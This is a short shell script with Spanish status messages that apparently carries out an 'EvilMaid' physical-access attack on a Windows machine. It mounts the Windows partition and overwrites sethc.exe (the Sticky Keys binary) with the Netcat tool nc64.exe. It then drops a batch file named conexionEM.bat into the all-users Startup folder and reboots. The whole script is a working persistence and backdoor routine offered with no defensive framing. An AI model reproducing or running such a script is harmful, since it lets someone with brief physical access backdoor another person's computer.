cd /mnt/
#mount sdb1/
mount sda2/
echo "Disco NTFS montado...!!!"
cp -r /mnt/sda2/Windows/System32/sethc.exe /mnt/sda2/Windows/System32/sethc.exe.orig
echo "Renombramiento sethc completada...!!!"
cp -r /mnt/sdb1/EvilMaid/nc64.exe /mnt/sda2/Windows/System32/sethc.exe
echo "Copia del Netcat completada...!!!"
cp -r /mnt/sdb1/EvilMaid/conexionEM.bat /mnt/sda2/ProgramData/Microsoft/Windows/Start\ Menu/Programs/StartUp/conexionEM.bat
echo "Copia de script para el startup completada...!!!"
sudo reboot
echo "Reiniciando...!!!"
#c:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\